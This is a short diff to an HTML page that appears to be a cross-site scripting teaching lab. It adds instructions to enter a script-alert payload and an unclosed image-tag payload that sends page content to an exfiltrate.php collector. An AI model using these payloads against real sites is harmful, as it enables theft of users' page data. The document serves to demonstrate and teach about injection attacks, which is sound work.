@@ -20,7 +20,10 @@
     </p>
     <h3>Hacking in</h3>
     <p>Enter the following:</p>
-    <p><pre>&lt;script&gt;alert("Pwned");&lt;/script&gt;</pre></p>
+    <p><pre>&lt;script&gt;alert(&quot;Pwned&quot;);&lt;/script&gt;</pre></p>
+    <p>Alternatively, try exfiltrating some content:</p>
+    <p><pre>&lt;img src=&quot;exfiltrate.php?data=</pre></p>
+    <p>Visit <a href="exfiltrate.php">exfiltrate.php</a> to view stolen data.</p>
     <p><a href="index.php">Reset</a></p>
   </body>
 </html>
